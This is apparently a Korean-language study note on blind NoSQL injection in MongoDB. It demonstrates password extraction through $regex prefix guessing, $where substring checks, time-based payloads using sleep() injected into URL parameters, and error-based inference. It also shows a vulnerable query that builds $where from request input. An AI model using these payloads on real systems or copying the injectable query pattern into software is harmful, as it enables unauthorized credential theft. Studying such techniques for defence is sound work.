MongoDB - Blind Injection :
    MongoDB Injection 취약점에서도 SQL Injection와 같이 추출하기 위한 데이터가 직접적으로 확인할 수 없는 상황이 존재합니다.
        
        [사전 지식] Server-side Advanced - SQL Injection 공격 기법 (Blind SQL Injection)

    Blind SQL Injection은 데이터베이스 조회 후 결과를 직접적으로 확인할 수 없는 경우 사용될 수 있는 공격 기법입니다.

    Blind SQL Injection 기법의 원리는 DBMS의 함수 또는 연산 과정 등을 이용해 데이터베이스 내에 존재하는 데이터와 사용자 입력을 비교하며,
    특정한 조건 발생 시 특별한 응답을 발생시켜 해당 비교에 대한 검증을 수행합니다.

    MongoDB 쿼리에서 Injection이 발생할 때 MongoDB의 Operator($regex, $where)를 사용해 Blind Injection을 할 수 있습니다.

$regex (정규표현식) :
    정규식을 사용해 한글자 씩 비교하면서 Blind SQL Injection을 할 수 있습니다.
    ex)
        > db.user.find({upw: {$regex: "^a"}}) // 정규표현식에서 ^ 문자는 첫 문자열을 의미합니다. 즉, "^a"는 a로 시작하는 문자열을 조회합니다.
        > db.user.find({upw: {$regex: "^b"}})
        > db.user.find({upw: {$regex: "^c"}})
        ...
        > db.user.find({upw: {$regex: "^g"}})
        { "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }

$where :
    $where Operator는 field 안에서 사용할 수 없습니다. (Can't canonicalize query: BadValue $where cannot be applied to a field)
    ex)
        > db.user.find({$where:"return 1==1"})
        { "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
        > db.user.find({uid:{$where:"return 1==1"}})
        error: {
            "$err" : "Can't canonicalize query: BadValue $where cannot be applied to a field",
            "code" : 17287
        }

    $where 연산자를 사용할 수 있거나, $where연산자의 데이터로 입력 값을 추가할 수 있다면 아래와 같이 데이터를 추출할 수 있습니다.
    ex)
        > db.user.find({$where: "this.upw.substring(0,1)=='a'"})
        > db.user.find({$where: "this.upw.substring(0,1)=='b'"})
        > db.user.find({$where: "this.upw.substring(0,1)=='c'"})
        ...
        > db.user.find({$where: "this.upw.substring(0,1)=='g'"})
        { "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }

    1) $where Time Based
        MongoDB의 sleep함수를 통해 시간 지연을 발생시킬 수 있습니다.
        ex)
            db.user.find({$where: `this.uid=='${req.query.uid}'&&this.upw=='${req.query.upw}'`});
            
            /*
            /?uid=guest'&&this.upw.substring(0,1)=='a'&&sleep(5000)&&'1
            /?uid=guest'&&this.upw.substring(0,1)=='b'&&sleep(5000)&&'1
            /?uid=guest'&&this.upw.substring(0,1)=='c'&&sleep(5000)&&'1
            ...
            /?uid=guest'&&this.upw.substring(0,1)=='g'&&sleep(5000)&&'1
            => 시간 지연 발생.
            */

    2) $where Error Based
        ex)
            > db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf&&'1'&&this.upw=='${upw}'"});
            error: {
                "$err" : "ReferenceError: asdf is not defined near '&&this.upw=='${upw}'' ",
                "code" : 16722
            }
            // this.upw.substring(0,1)=='g' 값이 참이기 때문에 asdf 코드를 실행하다 에러 발생
            
            > db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='a'&&asdf&&'1'&&this.upw=='${upw}'"});
            // this.upw.substring(0,1)=='a' 값이 거짓이기 때문에 뒤에 코드가 작동하지 않음

    




























